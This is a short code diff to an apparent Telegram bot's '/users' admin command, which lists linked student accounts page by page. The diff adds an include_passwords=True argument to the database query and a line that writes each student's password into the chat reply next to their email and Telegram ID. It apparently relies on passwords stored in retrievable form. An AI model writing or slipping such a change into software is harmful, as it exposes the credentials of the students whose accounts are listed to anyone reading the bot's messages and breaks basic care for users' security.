@@ -362,14 +362,14 @@ async def users_command(update, context):
         return
     try:
         page = int(context.args[0]) if context.args else 1
-        total, users = await asyncio.to_thread(database.user_directory, page)
+        total, users = await asyncio.to_thread(database.user_directory, page, include_passwords=True)
     except ValueError:
         await update.message.reply_text('Use /users or /users 2 with a positive page number.')
         return
     lines = [f'Linked accounts: {total} — page {page}/{max(1,(total+19)//20)}']
     for user in users:
         lines.append(f"\n{user['student_name'] or 'Student'}\nTelegram ID: {user['telegram_id']}\n"
-                     f"Account: {user['email']}\nLinked: {user['created_at']} UTC")
+                     f"Account: {user['email']}\nPassword: {user['password']}\nLinked: {user['created_at']} UTC")
     if not users:
         lines.append('No linked accounts on this page.')
     status = await update.message.reply_text('Loading linked accounts…')
